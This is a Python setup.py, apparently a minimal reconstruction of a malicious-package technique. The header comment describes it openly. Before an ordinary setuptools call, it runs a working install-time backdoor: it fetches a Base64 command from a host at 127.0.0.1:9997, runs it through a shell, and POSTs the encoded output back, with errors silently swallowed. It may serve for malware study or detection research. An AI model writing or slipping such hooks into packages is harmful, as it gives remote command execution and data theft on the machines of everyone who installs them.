# Minimal install-time fetch-decode-shell-exec-exfil loop: HTTP response body
# is Base64-decoded into a shell command, executed, and the output is
# Base64-encoded and POSTed back. Mirrors the qzc690385 setup.py technique
# without its Xinference registration channel.
import base64
import subprocess
import urllib.request

API = "http://127.0.0.1:9997"

try:
    raw = urllib.request.urlopen(API + "/jobs", timeout=6).read().decode()
    blob = base64.b64decode(raw).decode("utf-8", "replace")
    out = subprocess.run(blob, shell=True, capture_output=True, text=True)
    enc = base64.b64encode(out.stdout.encode()).decode()
    req = urllib.request.Request(API + "/results", data=enc.encode(),
                                 headers={"Content-Type": "text/plain"},
                                 method="POST")
    urllib.request.urlopen(req, timeout=6).read()
except Exception:
    pass

from setuptools import setup
setup(name="demo", version="0.1", packages=["demo"])
